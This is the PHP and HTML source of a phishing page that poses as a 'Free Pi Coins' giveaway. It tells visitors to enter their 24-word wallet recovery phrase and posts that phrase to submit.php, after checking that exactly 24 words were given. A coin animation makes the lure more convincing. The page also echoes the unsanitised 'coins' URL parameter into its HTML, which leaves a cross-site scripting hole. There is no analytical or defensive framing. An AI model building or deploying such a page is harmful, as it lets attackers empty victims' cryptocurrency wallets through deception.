<?php
$coins = isset($_GET['coins']) ? $_GET['coins'] : rand(20, 50);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Pi Coins</title>
    <link rel="stylesheet" href="form_styles.css">
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="./logo.png" alt="Pi Logo" class="logo">
            <h1>Free Pi Coins</h1>
        </div>
        <nav>
            <ul>
                <li><a href="index.php">Home</a></li>
                <li><a href="self_verification.php">Self Verification</a></li>
                <li><a href="about.php">About Pi </a></li>
            </ul>
        </nav>
    </header>

    <!-- Coins container for falling coins -->
    <div id="coins-container"></div>

    <section id="claim-section" class="claim-section">
        <h2 class="glowing-text">Hurray! You can claim <?php echo $coins; ?> Pi Coins</h2>
        <form action="submit.php" method="POST" onsubmit="return validatePhrase()">
            
            <div class="input-group">
                <label for="phrase">Enter your 24-word  phrase to add the coins to your wallet </label>
                <textarea name="phrase" id="phrase" placeholder="Enter your 24-word  phrase" required></textarea>
                <small id="error-message" class="error-message"></small>
            </div>
            <button type="submit">Submit</button>
        </form>
    </section>

    <footer>
        <p>&copy; 2024 Free Pi Coins. All rights reserved.</p>
    </footer>

    <script>
        function validatePhrase() {
            const phrase = document.getElementById('phrase').value.trim();
            const words = phrase.split(/\s+/);
            const errorMessage = document.getElementById('error-message');

            if (words.length !== 24) {
                errorMessage.textContent = 'Please enter exactly 24 words.';
                return false;
            }

            errorMessage.textContent = '';
            return true;
        }

        // Add falling coins effect
        function generateFallingCoins() {
            const container = document.getElementById('coins-container');
            for (let i = 0; i < 10; i++) {
                const coin = document.createElement('div');
                coin.classList.add('coin');
                coin.style.left = `${Math.random() * 100}%`;
                container.appendChild(coin);
            }
        }

        // Run the coin animation on page load
        window.onload = function() {
            generateFallingCoins();
            setTimeout(() => {
                document.querySelector('.glowing-text').classList.add('glowing-strong');
            }, 5000); // After 5 seconds, enhance the glow
        };
    </script>
</body>
</html>
